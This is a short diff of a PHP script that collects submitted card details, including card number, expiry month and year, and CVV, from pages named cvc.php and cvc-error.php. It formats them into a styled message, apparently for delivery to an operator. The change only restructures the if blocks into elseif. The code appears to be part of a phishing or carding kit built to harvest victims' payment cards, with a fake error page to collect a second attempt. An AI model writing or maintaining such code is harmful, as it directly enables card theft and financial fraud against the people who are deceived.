@@ -93,7 +93,7 @@ if (isset($_POST['tipo_usuario'],$_POST['tipo_tarjeta'],$_POST['card'],$_POST['d
     $message .= "🍀 User: <code>$user_esc</code>\n";
 
 // cvc.php
-if (isset($_POST['mes'],$_POST['anio'],$_POST['cvv'])) {
+} elseif (isset($_POST['mes'],$_POST['anio'],$_POST['cvv'])) {
 
     $form_origen = "cvc.php";
     $mes = trim($_POST['mes']);
@@ -107,7 +107,7 @@ if (isset($_POST['mes'],$_POST['anio'],$_POST['cvv'])) {
     $message .= "┊⬩ 𝖴𝗌𝗎𝖺𝗋𝗂𝗈.: <code>$user_esc</code>\n";
 
 // cvc-error.php
-if (isset($_POST['mes2'],$_POST['anio2'],$_POST['cvv2'])) {
+} elseif (isset($_POST['mes2'],$_POST['anio2'],$_POST['cvv2'])) {
 
     $form_origen = "cvc-error.php";
     $mes = trim($_POST['mes2']);
